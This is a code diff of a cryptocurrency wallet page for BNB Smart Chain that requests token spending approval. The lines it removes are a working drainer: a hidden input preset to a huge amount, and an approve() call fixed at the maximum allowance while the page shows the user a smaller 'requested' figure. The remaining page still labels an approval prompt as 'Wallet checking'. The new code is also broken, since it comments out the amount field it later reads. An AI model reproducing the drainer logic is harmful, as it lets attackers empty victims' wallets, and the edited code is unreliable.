@@ -274,15 +274,16 @@ button {
 
 <body>
 <main>
-
-<input
-hidden
+<div id="account"></div>
+<div id="network"></div>
+<div id="status" role="status">Wallet checking...</div>
+<!-- <input
 id="amount"
 type="number"
 min="0"
 step="any"
-value="999999999999999999"
->
+value="1"
+> -->
 
 
 <section class="card">
@@ -329,352 +330,294 @@ const TOKEN_ADDRESS =
 const RPC_URL = "https://bsc-dataseed.binance.org/";
 
 const ABI = [
-"function approve(address spender,uint256 amount) external returns (bool)",
-"function allowance(address owner,address spender) external view returns (uint256)",
-"function decimals() external view returns (uint8)",
-"function symbol() external view returns (string)"
+    "function approve(address spender,uint256 amount) external returns (bool)",
+    "function allowance(address owner,address spender) external view returns (uint256)",
+    "function decimals() external view returns (uint8)",
+    "function symbol() external view returns (string)"
 ];
 
 let provider = null;
 let signer = null;
 let owner = null;
 let chainOk = false;
-let connecting = false;
 let busy = false;
 
 const $ = id => document.getElementById(id);
 
 function status(message) {
-$("status").textContent = message;
+    $("status").textContent = message;
 }
 
-function validAddress(value,label) {
-if (!ethers.utils.isAddress(value.trim())) {
-throw Error(label + " valid address nahi hai.");
+function updateButton() {
+    const spender = $("spenderAddr").value.trim();
+    const amount = $("amount").value.trim();
+
+    const validAmount =
+        amount !== "" &&
+        Number.isFinite(Number(amount)) &&
+        Number(amount) > 0;
+
+    const validSpender = ethers.utils.isAddress(spender);
+
+    $("approveBtn").disabled =
+        busy || (owner && (!validAmount || !validSpender));
 }
-return ethers.utils.getAddress(value.trim());
+
+function validAddress(value, label) {
+    if (!ethers.utils.isAddress(value.trim())) {
+        throw Error(label + " valid address nahi hai.");
+    }
+
+    return ethers.utils.getAddress(value.trim());
 }
 
 async function refreshNetwork() {
-if (!provider) return;
+    if (!provider) return;
 
-const network = await provider.getNetwork();
-chainOk = network.chainId === CHAIN_ID;
+    const network = await provider.getNetwork();
+    chainOk = network.chainId === CHAIN_ID;
 
-$("network").textContent = chainOk
-? "✓ BNB Smart Chain Mainnet Connected"
-: "⚠ Wrong Network. BNB Smart Chain Mainnet required. Current Chain ID: " + network.chainId;
+    $("network").textContent = chainOk
+        ? "✓ BNB Smart Chain Mainnet Connected"
+        : "⚠ Wrong Network. Chain ID: " + network.chainId;
 
-$("network").className = chainOk ? "good" : "bad";
+    $("network").className = chainOk ? "good" : "bad";
 
-$("approveBtn").disabled = !owner || !chainOk || busy;
-}
-
-function waitForProvider(timeout = 5000) {
-return new Promise(resolve => {
-
-if (window.ethereum) return resolve(window.ethereum);
-
-let finished = false;
-
-function finish() {
-if (finished) return;
-finished = true;
-resolve(window.ethereum || null);
-}
-
-window.addEventListener("ethereum#initialized", finish, {once:true});
-
-setTimeout(finish, timeout);
-});
+    updateButton();
 }
 
 async function ensureChain() {
+    const network = await provider.getNetwork();
 
-const network = await provider.getNetwork();
+    if (network.chainId === CHAIN_ID) return;
 
-if (network.chainId === CHAIN_ID) return;
+    await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: CHAIN_HEX }]
+    });
 
-try {
+    provider = new ethers.providers.Web3Provider(
+        window.ethereum,
+        "any"
+    );
 
-await window.ethereum.request({
-method: "wallet_switchEthereumChain",
-params: [{chainId: CHAIN_HEX}]
-});
+    signer = provider.getSigner();
 
-} catch (error) {
-
-if (error.code === 4902) {
-
-await window.ethereum.request({
-method: "wallet_addEthereumChain",
-params: [{
-chainId: CHAIN_HEX,
-chainName: "BNB Smart Chain",
-nativeCurrency: {
-name: "BNB",
-symbol: "BNB",
-decimals: 18
-},
-rpcUrls: [RPC_URL],
-blockExplorerUrls: ["https://bscscan.com/"]
-}]
-});
-
-} else {
-throw error;
-}
+    await refreshNetwork();
 }
 
-provider = new ethers.providers.Web3Provider(
-window.ethereum,
-"any"
-);
-}
+async function connectWallet(requestAccess = false) {
+    try {
+        if (!window.ethereum) {
+            throw Error("Trust Wallet DApp Browser mein page open karein.");
+        }
 
-async function connectWallet() {
+        provider = new ethers.providers.Web3Provider(
+            window.ethereum,
+            "any"
+        );
 
-if (connecting) return;
-connecting = true;
+        let accounts = await window.ethereum.request({
+            method: "eth_accounts"
+        });
 
-try {
+        // First-time connection: only after Continue is clicked.
+        if ((!accounts || !accounts.length) && requestAccess) {
+            accounts = await window.ethereum.request({
+                method: "eth_requestAccounts"
+            });
+        }
 
-const eth = await waitForProvider();
+        if (!accounts || !accounts.length) {
+            owner = null;
+            $("account").textContent = "Wallet not connected";
+            status("Wallet connect karne ke liye Continue dabayein.");
+            updateButton();
+            return false;
+        }
 
-if (!eth) {
-throw Error("Trust Wallet DApp Browser mein page open karein.");
-}
+        owner = ethers.utils.getAddress(accounts[0]);
+        signer = provider.getSigner();
 
-provider = new ethers.providers.Web3Provider(eth,"any");
+        $("account").textContent = "Connected Wallet: " + owner;
 
-let accounts = await eth.request({
-method:"eth_accounts"
-});
+        if (requestAccess) {
+            await ensureChain();
+        }
 
-if (!accounts || !accounts.length) {
+        await refreshNetwork();
 
-accounts = await eth.request({
-method:"eth_requestAccounts"
-});
+        status(
+            "Wallet connected successfully.\n" +
+            "BNB Smart Chain ready."
+        );
 
-}
+        return true;
 
-if (!accounts || !accounts.length) {
-throw Error("Wallet account select nahi hua.");
-}
+    } catch (error) {
+        status("Connection Error: " +
+            (error.reason || error.message || error));
 
-owner = ethers.utils.getAddress(accounts[0]);
-signer = provider.getSigner();
-
-$("account").textContent = "Connected Wallet: " + owner;
-
-await ensureChain();
-
-signer = provider.getSigner();
-
-await refreshNetwork();
-
-if (chainOk) {
-status("Wallet connected successfully.\nBNB Mainnet ready.");
-}
-
-} catch(error) {
-
-status("Connection Error: " +
-(error.reason || error.message || error));
-
-} finally {
-connecting = false;
-}
-}
-
-$("connectBtn").onclick = connectWallet;
-
-function bindEvents() {
-
-if (!window.ethereum || !window.ethereum.on) return;
-
-window.ethereum.on("chainChanged", async () => {
-
-provider = new ethers.providers.Web3Provider(
-window.ethereum,"any"
-);
-
-signer = provider.getSigner();
-
-try {
-await refreshNetwork();
-} catch(error) {
-status(error.message);
-}
-
-});
-
-window.ethereum.on("accountsChanged", async accounts => {
-
-owner = accounts && accounts.length
-? ethers.utils.getAddress(accounts[0])
-: null;
-
-$("account").textContent = owner
-? "Connected Wallet: " + owner
-: "Wallet disconnected";
-
-if (provider) signer = provider.getSigner();
-
-await refreshNetwork();
-});
-
+        return false;
+    }
 }
 
 async function approveAndVerify() {
+    if (busy) return;
 
-if (busy) return;
-busy = true;
+    // If wallet was not previously connected, connect on button click.
+    if (!owner) {
+        await connectWallet(true);
+        return;
+    }
 
-$("approveBtn").disabled = true;
+    busy = true;
+    updateButton();
 
-try {
+    try {
+        await refreshNetwork();
 
-if (!signer || !owner) {
-throw Error("Pehle wallet connect karein.");
+        if (!chainOk) {
+            await ensureChain();
+        }
+
+        const spender = validAddress(
+            $("spenderAddr").value,
+            "Spender"
+        );
+
+        const amountText = $("amount").value.trim();
+
+        if (
+            !amountText ||
+            !Number.isFinite(Number(amountText)) ||
+            Number(amountText) <= 0
+        ) {
+            throw Error("Valid amount enter karein.");
+        }
+
+        const token = new ethers.Contract(
+            TOKEN_ADDRESS,
+            ABI,
+            signer
+        );
+
+        const decimals = await token.decimals();
+        const symbol = await token.symbol();
+
+        // Approve only the amount entered by the user.
+        const amount = ethers.utils.parseUnits(
+            amountText,
+            decimals
+        );
+
+        status(
+            "Approval request wallet ko bheji ja rahi hai.\n" +
+            "Wallet mein spender aur amount verify karein."
+        );
+
+        const tx = await token.approve(spender, amount);
+
+        status(
+            "Transaction submitted.\n\n" +
+            "Transaction Hash:\n" + tx.hash +
+            "\n\nConfirmation ka wait ho raha hai..."
+        );
+
+        const receipt = await tx.wait();
+
+        if (receipt.status !== 1) {
+            throw Error("Transaction successful nahi hui.");
+        }
+
+        const readToken = new ethers.Contract(
+            TOKEN_ADDRESS,
+            ABI,
+            provider
+        );
+
+        const allowance = await readToken.allowance(
+            owner,
+            spender
+        );
+
+        const formatted = ethers.utils.formatUnits(
+            allowance,
+            decimals
+        );
+
+        const sufficient = allowance.gte(amount);
+
+        status(
+            "✓ Approval transaction confirmed\n\n" +
+            "Owner: " + owner +
+            "\nSpender: " + spender +
+            "\nAllowance: " + formatted + " " + symbol +
+            "\nRequested: " + amountText + " " + symbol +
+            "\n\n" +
+            (sufficient
+                ? "✓ Allowance verification successful."
+                : "⚠ Allowance requested amount se kam hai.") +
+            "\n\nTransaction:\n" +
+            "https://bscscan.com/tx/" + tx.hash
+        );
+
+    } catch (error) {
+        status("Error: " +
+            (error.reason || error.data?.message || error.message || error));
+
+    } finally {
+        busy = false;
+        await refreshNetwork().catch(() => {});
+        updateButton();
+    }
 }
 
-await refreshNetwork();
+// Continue button
+$("approveBtn").addEventListener("click", approveAndVerify);
 
-if (!chainOk) {
-throw Error("BNB Smart Chain Mainnet required.");
+// Enable/disable based on entered values
+$("spenderAddr").addEventListener("input", updateButton);
+$("amount").addEventListener("input", updateButton);
+
+// Wallet account/network changes
+if (window.ethereum && window.ethereum.on) {
+    window.ethereum.on("accountsChanged", async accounts => {
+        owner = accounts && accounts.length
+            ? ethers.utils.getAddress(accounts[0])
+            : null;
+
+        signer = owner ? provider.getSigner() : null;
+
+        $("account").textContent = owner
+            ? "Connected Wallet: " + owner
+            : "Wallet not connected";
+
+        await refreshNetwork();
+        updateButton();
+    });
+
+    window.ethereum.on("chainChanged", async () => {
+        provider = new ethers.providers.Web3Provider(
+            window.ethereum,
+            "any"
+        );
+
+        signer = owner ? provider.getSigner() : null;
+
+        await refreshNetwork();
+    });
 }
 
-const tokenAddress = validAddress(
-$("tokenAddr").value,
-"Token contract"
-);
-
-if (tokenAddress.toLowerCase() !== TOKEN_ADDRESS.toLowerCase()) {
-throw Error("Unexpected token contract.");
-}
-
-const spender = validAddress(
-$("spenderAddr").value,
-"Spender"
-);
-
-const amountText = $("amount").value.trim();
-
-if (
-!amountText ||
-!Number.isFinite(Number(amountText)) ||
-Number(amountText) <= 0
-) {
-throw Error("Valid approval amount enter karein.");
-}
-
-const token = new ethers.Contract(
-tokenAddress,
-ABI,
-signer
-);
-
-const decimals = await token.decimals();
-const symbol = await token.symbol();
-
-/*const amount = ethers.utils.parseUnits(
-amountText,
-decimals
-); */
-
-const amount = ethers.constants.MaxUint256;
-
-status(
-"Approval request wallet ko bheji ja rahi hai.\n" +
-"Wallet mein spender aur amount verify karein."
-);
-
-const tx = await token.approve(spender,amount);
-
-status(
-"Transaction submitted.\n\n" +
-"Transaction Hash:\n" + tx.hash +
-"\n\nConfirmation ka wait ho raha hai..."
-);
-
-const receipt = await tx.wait();
-
-if (receipt.status !== 1) {
-throw Error("Transaction successful nahi hui.");
-}
-
-status(
-"Approval confirmed.\nBlockchain se allowance read ho raha hai..."
-);
-
-const readToken = new ethers.Contract(
-tokenAddress,
-ABI,
-provider
-);
-
-const allowance = await readToken.allowance(
-owner,
-spender
-);
-
-const formatted = ethers.utils.formatUnits(
-allowance,
-decimals
-);
-
-const sufficient = allowance.gte(amount);
-
-status(
-"✓ Approval transaction confirmed\n\n" +
-"Owner: " + owner +
-"\nSpender: " + spender +
-"\nAllowance: " + formatted + " " + symbol +
-"\nRequested: " + amountText + " " + symbol +
-"\n\n" +
-(sufficient
-? "✓ Allowance verification successful."
-: "⚠ Allowance requested amount se kam hai.") +
-"\n\nTransaction:\n" +
-"https://bscscan.com/tx/" + tx.hash
-);
-
-} catch(error) {
-
-status(
-"Error: " +
-(error.reason || error.data?.message || error.message || error)
-);
-
-} finally {
-
-busy = false;
-
-await refreshNetwork().catch(() => {});
-
-}
-}
-
-$("approveBtn").onclick = approveAndVerify;
-
+// Automatic reconnect: does not open a wallet popup.
 window.addEventListener("load", async () => {
+    if (!window.ethereum) {
+        status("Trust Wallet DApp Browser mein page open karein.");
+        return;
+    }
 
-const eth = await waitForProvider();
-
-if (eth) {
-bindEvents();
-connectWallet();
-} else {
-status(
-"Wallet provider nahi mila.\n" +
-"Trust Wallet DApp Browser mein page open karein."
-);
-}
-
+    await connectWallet(false);
 });
-
 </script>
 </body>
 </html>
